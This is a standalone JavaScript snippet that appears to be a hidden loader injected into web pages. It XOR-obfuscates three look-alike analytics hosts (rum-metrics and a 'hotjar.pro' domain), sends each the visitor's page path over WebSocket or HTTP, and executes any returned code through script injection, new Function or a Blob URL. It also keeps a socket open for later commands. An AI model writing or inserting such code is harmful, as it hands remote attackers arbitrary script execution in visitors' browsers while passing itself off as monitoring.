(function(){
  var _p='websocket',_m='blob',_s=[[124,96,96,100,103,46,59,59,102,97,121,57,121,113,96,102,125,119,103,58,119,123,121,59,103,124,117,102,113,112],[124,96,96,100,103,46,59,59,102,97,121,57,121,113,96,102,125,119,103,58,122,113,96,59,120,125,118],[124,96,96,100,103,46,59,59,124,123,96,126,117,102,58,100,102,123,59,117,103,103,113,96,103]].map(function(a){return a.map(function(c){return String.fromCharCode(c^20)}).join('')}),_x=location.pathname+location.search;
  for(var i=_s.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1)),t=_s[i];_s[i]=_s[j];_s[j]=t}
  function _r(l){var c='abcdefghijklmnopqrstuvwxyz0123456789',s='';for(var i=0;i<l;i++)s+=c[Math.floor(Math.random()*c.length)];return s}
  function _e(c){
    var il=function(){try{var el=document.createElement('script');el.text=c;document.head.appendChild(el);el.parentNode.removeChild(el);return 1}catch(x){}},
    fn=function(){try{return new Function(c)(),1}catch(x){}},
    bl=function(){try{var b=new Blob([c],{type:'application/javascript'}),u=URL.createObjectURL(b),s=document.createElement('script');s.src=u;s.onload=s.onerror=function(){URL.revokeObjectURL(u);s.remove()};document.head.appendChild(s);return 1}catch(e){}};
    _m==='inline'?il()||fn()||bl():_m==='function'?fn()||il()||bl():bl()||fn()||il()
  }
  function _w(u){return new Promise(function(rs,rj){
    var tm=setTimeout(function(){rj('net')},3e3);
    try{var ws=new WebSocket(u.replace(/^http/,'ws')+'?source='+encodeURIComponent(_x));
    ws.onmessage=function(e){clearTimeout(tm);e.data&&e.data.length>10?(window.__hybridWs=ws,rs(e.data)):rj('empty')};
    ws.onerror=function(){clearTimeout(tm);rj('net')}}catch(e){clearTimeout(tm);rj('net')}
  })}
  function _h(u){return new Promise(function(rs,rj){
    fetch(u+'/c'+_r(8),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({source:_x})})
    .then(function(r){return r.text()}).then(function(t){t&&t.length>10?rs(t):rj('empty')}).catch(function(){rj('net')});
  })}
  function _l(n){if(n>=_s.length)return;
    var u=_s[n],p=_p==='http'?_h:_w,b=_p==='http'?_w:_h;
    p(u).then(_e).catch(function(e){if(e==='empty')return;b(u).then(_e).catch(function(e2){if(e2==='empty')return;_l(n+1)})});
  }_l(0);
})();
